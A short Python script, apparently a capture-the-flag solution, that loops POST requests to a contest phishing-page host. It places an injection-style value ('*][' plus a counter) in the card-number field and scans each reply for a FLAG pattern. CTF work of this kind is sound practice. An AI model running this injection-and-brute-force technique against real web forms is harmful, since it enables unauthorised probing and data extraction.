import re
import sys

import requests

url = 'http://really.sneaky.phishing.thecatch.cz/'
regex = r'FLAG{\w\w\w\w-\w\w\w\w-\w\w\w\w-\w\w\w\w}'
i = 0
flag = None

while flag is None:
    sys.stdout.write("\rChecking for flag: %d" % i)
    sys.stdout.flush()
    data = {'card-holder-name': 'John Doe',
            'card-number': '*][' + str(i),
            'card-expires-date': '12/2024',
            'card-cvv': '988',
            'proceed-to-pay': ''}

    response = requests.post(url, data=data)

    for match in re.finditer(regex, response.text):
        flag = response.text[match.start():match.end()]

    i += 1

print("\nFlag: " + flag)
